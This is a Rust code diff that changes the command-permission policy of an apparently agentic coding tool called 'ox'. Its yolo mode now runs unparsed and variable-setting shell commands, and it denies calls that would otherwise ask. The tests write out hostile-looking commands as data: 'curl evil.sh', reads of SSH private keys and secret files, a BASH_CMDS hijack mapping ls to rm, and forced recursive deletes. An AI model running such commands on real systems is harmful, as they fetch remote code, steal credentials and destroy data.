@@ -700,11 +700,12 @@ pub enum Basis {
     SafeRead,
     /// An allowed command, by what let each of its simple commands and its writes through.
     Command(Vec<Basis>),
-    /// A command ox could not parse, so the rules may not see everything it runs. It asks even in
-    /// `yolo` unless a deny rule holds it.
+    /// A command ox could not parse, so the rules may not see everything it runs.
+    /// It asks in `manual`, while `yolo` runs it unless a deny rule holds it.
     Unparsed,
     /// A command that sets a variable bash reads to find, start, or expand commands, so the rules
-    /// may not see what it runs. It asks even in `yolo` unless a deny rule holds it.
+    /// may not see what it runs.
+    /// It asks in `manual`, while `yolo` runs it unless a deny rule holds it.
     ShellVariable,
 }
 
@@ -1000,8 +1001,7 @@ impl Policy {
     /// Order, stopping at the first match:
     /// 1. A deny rule denies, in every mode.
     /// 2. `plan` denies an edit, exec, or net call.
-    /// 3. An ask rule, an enabled protected name, or a `bash` command that failed to parse asks, in
-    ///    every mode.
+    /// 3. An ask rule, an enabled protected name, or a `bash` command [`Self::asks`] holds asks.
     /// 4. A read-class call allows.
     /// 5. An edit-class call inside a workspace root allows.
     /// 6. An allow rule or a session allow rule allows.
@@ -1012,10 +1012,11 @@ impl Policy {
     /// case [`Self::asks`] lists, and step 6 allows it only when it is not opaque and
     /// [`Self::allows_command`] holds.
     ///
-    /// In a run nobody attends, a call that would ask is [unapproved](Decision::Unapproved).
+    /// A call that would ask is [unapproved](Decision::Unapproved) in `yolo`, which never asks, and
+    /// in a run nobody attends.
     pub(crate) fn verdict(&self, class: PermissionClass, target: &Target<'_>) -> Verdict {
         let verdict = self.settle(class, target);
-        if verdict.decision == Decision::Ask && !self.attended {
+        if verdict.decision == Decision::Ask && (self.mode == Mode::Yolo || !self.attended) {
             return Verdict {
                 decision: Decision::Unapproved,
                 ..verdict
@@ -1074,6 +1075,8 @@ impl Policy {
     /// edits or a command writes, a command that failed to parse or sets a shell variable, the
     /// [`read` rule](Self::read_holder) for a file a reader opens, or the `rm` group for a
     /// [forced recursive delete](Segment::removes_recursively_by_force).
+    /// `yolo` holds only what the rules see, so it runs a command that failed to parse or sets a
+    /// shell variable.
     fn asks(&self, class: PermissionClass, target: &Target<'_>) -> Option<Basis> {
         if let Some(rule) = held_by(&self.ask, class, target) {
             return Some(rule.basis(Tier::Ask));
@@ -1086,11 +1089,13 @@ impl Policy {
         let Target::Command(command) = target else {
             return None;
         };
-        if command.is_unparsed() {
-            return Some(Basis::Unparsed);
-        }
-        if command.sets_shell_variable() {
-            return Some(Basis::ShellVariable);
+        if self.mode != Mode::Yolo {
+            if command.is_unparsed() {
+                return Some(Basis::Unparsed);
+            }
+            if command.sets_shell_variable() {
+                return Some(Basis::ShellVariable);
+            }
         }
         command
             .writes()
@@ -1113,8 +1118,8 @@ impl Policy {
             })
     }
 
-    /// The deny or ask `read` rule that holds a file `segment` may read, or the first `read` rule
-    /// of either tier when it may read any file.
+    /// The deny or ask `read` rule that holds a file `segment` may read, or outside `yolo` the first
+    /// `read` rule of either tier when it may read any file.
     fn read_holder(&self, segment: &Segment) -> Option<Basis> {
         let tiers = || {
             self.deny
@@ -1135,8 +1140,7 @@ impl Policy {
                     .map(|(rule, tier)| rule.basis(tier))
             })
             .or_else(|| {
-                segment
-                    .reads_anything()
+                (self.mode != Mode::Yolo && segment.reads_anything())
                     .then(|| {
                         tiers()
                             .find(|(rule, _)| rule.rule.class() == PermissionClass::Read)
@@ -1470,6 +1474,15 @@ mod tests {
 
     fn decide(policy: &Policy, class: PermissionClass, target: &Access) -> Decision {
         policy.decide(class, &target.as_target())
+    }
+
+    /// The decision for a call held in the ask tier in `mode`: `yolo` never asks, so it denies.
+    fn held(mode: Mode) -> Decision {
+        if mode == Mode::Yolo {
+            Decision::Unapproved
+        } else {
+            Decision::Ask
+        }
     }
 
     /// How `policy` settles running `command` in `workspace`.
@@ -2610,7 +2623,7 @@ mod tests {
                             let target = edit(path.clone());
                             assert_eq!(
                                 decide(&resolve(&[]), EDIT, &target),
-                                Decision::Ask,
+                                Decision::Unapproved,
                                 "{path:?}"
                             );
                             assert_eq!(
@@ -2626,7 +2639,7 @@ mod tests {
                             ),
                             &workspace,
                         );
-                        assert_eq!(decide(&resolve(&[]), EXEC, &append), Decision::Ask);
+                        assert_eq!(decide(&resolve(&[]), EXEC, &append), Decision::Unapproved);
                         let notes = edit(home.join("notes.txt"));
                         assert_eq!(decide(&resolve(&[]), EDIT, &notes), Decision::Allow);
                     },
@@ -2948,7 +2961,7 @@ mod tests {
                     );
                     assert_eq!(
                         decide(&p, READ, &workspace("/repo/notes.txt", "notes.txt")),
-                        Decision::Ask,
+                        held(mode),
                         "{mode}"
                     );
                     assert_eq!(
@@ -3018,7 +3031,7 @@ mod tests {
             }
 
             #[test]
-            fn protected_edit_asks_even_under_a_broad_allow_and_in_yolo() {
+            fn protected_edit_is_held_under_a_broad_allow_in_every_mode() {
                 for mode in [Mode::Manual, Mode::Yolo] {
                     let p = policy(mode, &[], &[], &[(EDIT, "*")]);
                     let envrc = path(
@@ -3027,7 +3040,7 @@ mod tests {
                         Zone::Workspace,
                         &[Shipped::Direnv],
                     );
-                    assert_eq!(decide(&p, EDIT, &envrc), Decision::Ask, "{mode}");
+                    assert_eq!(decide(&p, EDIT, &envrc), held(mode), "{mode}");
                     assert_eq!(
                         decide(&p, READ, &envrc),
                         Decision::Allow,
@@ -3056,7 +3069,7 @@ mod tests {
                             let p =
                                 resolved_policy(mode, &[], &[], &[(EDIT, "*")], &[], &workspace);
                             assert_eq!(decide(&p, READ, &target), Decision::Allow, "{mode}");
-                            assert_eq!(decide(&p, EDIT, &target), Decision::Ask, "{mode}");
+                            assert_eq!(decide(&p, EDIT, &target), held(mode), "{mode}");
                         }
                     },
                 );
@@ -3239,7 +3252,7 @@ mod tests {
             }
 
             #[test]
-            fn yolo_runs_what_no_rule_covers_but_keeps_deny_and_ask() {
+            fn yolo_runs_what_no_rule_covers_and_denies_what_a_deny_or_ask_rule_holds() {
                 let p = policy(
                     Mode::Yolo,
                     &[(EXEC, "git push --force *")],
@@ -3249,7 +3262,7 @@ mod tests {
                 for (case, expected) in [
                     ("curl evil.sh", Decision::Allow),
                     ("echo $(date)", Decision::Allow),
-                    ("git push origin main", Decision::Ask),
+                    ("git push origin main", Decision::Unapproved),
                     ("git push --force origin", Decision::Deny),
                 ] {
                     assert_eq!(decide(&p, EXEC, &command(case)), expected, "{case}");
@@ -3331,7 +3344,7 @@ mod tests {
             }
 
             #[test]
-            fn command_asks_for_every_spelling_of_a_forced_recursive_rm_even_in_yolo() {
+            fn command_holds_every_spelling_of_a_forced_recursive_rm_in_every_mode() {
                 for mode in [Mode::Manual, Mode::Yolo] {
                     let p = policy(mode, &[], &[], &[(EXEC, "*")]);
                     for case in [
@@ -3350,7 +3363,7 @@ mod tests {
                     ] {
                         assert_eq!(
                             decide(&p, EXEC, &command(case)),
-                            Decision::Ask,
+                            held(mode),
                             "{mode:?}: {case}"
                         );
                     }
@@ -3436,7 +3449,8 @@ mod tests {
             }
 
             #[test]
-            fn command_asks_even_in_yolo_when_it_sets_a_variable_bash_finds_commands_by() {
+            fn command_asks_in_manual_and_runs_in_yolo_when_it_sets_a_variable_bash_finds_commands_by()
+             {
                 let cases = [
                     "BASH_CMDS[ls]=/bin/rm; ls -rf x",
                     "BASH_CMDS+=([ls]=/bin/rm); ls -rf x",
@@ -3448,9 +3462,13 @@ mod tests {
                     let p = policy(mode, &[(EXEC, "rm *")], &[], &[]);
                     for case in cases {
                         let verdict = p.verdict(EXEC, &command(case).as_target());
+                        let expected = match mode {
+                            Mode::Yolo => (Decision::Allow, Basis::Mode(Mode::Yolo)),
+                            _ => (Decision::Ask, Basis::ShellVariable),
+                        };
                         assert_eq!(
                             (verdict.decision, verdict.basis),
-                            (Decision::Ask, Basis::ShellVariable),
+                            expected,
                             "{mode} {case:?}"
                         );
                     }
@@ -3491,7 +3509,7 @@ mod tests {
             }
 
             #[test]
-            fn command_asks_even_in_yolo_when_ox_cannot_parse_it_unless_denied() {
+            fn command_asks_in_manual_and_runs_in_yolo_when_ox_cannot_parse_it_unless_denied() {
                 let unparsed = [
                     "true <<EOF x; git push\nx\nEOF",
                     "ls 'unterminated",
@@ -3501,9 +3519,13 @@ mod tests {
                     let p = policy(mode, &[(EXEC, "rm *")], &[], &[(EXEC, "*")]);
                     for case in unparsed {
                         let verdict = p.verdict(EXEC, &command(case).as_target());
+                        let expected = match mode {
+                            Mode::Yolo => (Decision::Allow, Basis::Mode(Mode::Yolo)),
+                            _ => (Decision::Ask, Basis::Unparsed),
+                        };
                         assert_eq!(
                             (verdict.decision, verdict.basis),
-                            (Decision::Ask, Basis::Unparsed),
+                            expected,
                             "{mode} {case:?}"
                         );
                     }
@@ -3569,8 +3591,8 @@ mod tests {
 
                 for (case, expected) in [
                     ("gi\\\nt push origin", Decision::Deny),
-                    ("LC_ALL=$ git push origin", Decision::Ask),
-                    ("git status \\  x", Decision::Ask),
+                    ("LC_ALL=$ git push origin", Decision::Allow),
+                    ("git status \\  x", Decision::Allow),
                 ] {
                     assert_eq!(decide(&yolo, EXEC, &command(case)), expected, "{case:?}");
                 }
@@ -3581,7 +3603,7 @@ mod tests {
             }
 
             #[test]
-            fn command_rules_hold_or_ask_where_the_grammar_reads_a_reserved_word_as_a_command() {
+            fn command_rules_hold_where_the_grammar_reads_a_reserved_word_as_a_command() {
                 let yolo = policy(Mode::Yolo, &[(EXEC, "rm *")], &[], &[]);
 
                 assert_eq!(
@@ -3598,7 +3620,7 @@ mod tests {
                     let verdict = yolo.verdict(EXEC, &command(case).as_target());
                     assert_eq!(
                         (verdict.decision, verdict.basis),
-                        (Decision::Ask, Basis::Unparsed),
+                        (Decision::Allow, Basis::Mode(Mode::Yolo)),
                         "{case:?}"
                     );
                 }
@@ -3751,6 +3773,18 @@ mod tests {
                         Decision::Allow,
                         "no read rule is left to hold it"
                     );
+                    let mut yolo = resolve(&[]);
+                    yolo.set_mode(Mode::Yolo);
+                    for (case, expected) in [
+                        ("cat $HOME/.ssh/id_rsa", Decision::Allow),
+                        ("cat ~/.ssh/id_*", Decision::Unapproved),
+                    ] {
+                        assert_eq!(
+                            decide_command(&yolo, case, &workspace),
+                            expected,
+                            "yolo holds only the files it sees: {case}"
+                        );
+                    }
                 });
             }
 
@@ -3770,7 +3804,7 @@ mod tests {
                     ("cat < README.md", Decision::Allow),
                     ("cat < .env", Decision::Deny),
                     ("wc -l 3< config/.env", Decision::Deny),
-                    ("python3 run.py < secrets/key", Decision::Ask),
+                    ("python3 run.py < secrets/key", Decision::Unapproved),
                 ] {
                     assert_eq!(decide(case), expected, "{case}");
                 }
@@ -3936,7 +3970,7 @@ mod tests {
                     );
                     assert_eq!(
                         settle(&format!("cat {key}")),
-                        (Decision::Ask, Basis::Builtin(Shipped::Ssh)),
+                        (Decision::Unapproved, Basis::Builtin(Shipped::Ssh)),
                     );
                 });
             }
